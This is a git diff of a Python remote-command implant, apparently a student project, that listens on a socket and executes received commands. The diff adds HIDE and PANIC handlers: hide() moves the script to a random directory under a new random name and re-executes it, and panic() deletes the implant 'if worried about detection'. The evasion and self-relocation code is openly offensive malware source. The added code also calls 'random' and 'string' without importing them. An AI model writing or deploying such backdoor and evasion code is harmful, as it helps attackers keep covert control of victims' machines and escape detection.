@@ -1,5 +1,6 @@
 import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs
 
+
 def runServer():
     HOST = "localhost" #"192.168.1.8"
     PORT = 1337 #52
@@ -36,10 +37,12 @@ def connectionLoop(conn, addr):
 
         ##handle special commands
         if (cmd[0] == "HIDE"):
-            #Execute a hide
+            conn.close()
+            hide()
             exit(0)
         elif (cmd[0] == "PANIC"):
-            #clean up
+            conn.close()
+            panic()
             exit(0)
 
         ##try to execute the command
@@ -181,6 +184,42 @@ def processInput(uinput):
         #command was too large
         return None
     return None
+
+#def hide()
+#Move the file to a random location on machine and run it
+def hide():
+    source = sys.argv[0] #current file
+
+    directories=[]
+
+    for root, dirs, files in os.walk("C:/Users/Cameron/Desktop/CS"): #walk all directories to find random place to hide
+        for dir in dirs:
+            directories.append(root+"/"+dir+"/") 
+
+    newDir = ""
+    while newDir == "":
+        try:
+            newDir = random.choice(directories)
+            newFile=newDir+randomString()+".py" #new file to place in random location
+            os.rename(source,newFile) #move current program to new location
+
+        except Exception as e: #if directory is protected or private, try again
+            print(e)
+            newDir=""
+
+    exec(open(newFile).read())
+    exit()
+        
+
+
+#def panic()
+#remove the implant if worried about detection
+def panic():
+    os.remove(sys.argv[0])
+
+def randomString(stringLength=10):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(stringLength))
     
 
 #######################################################################################
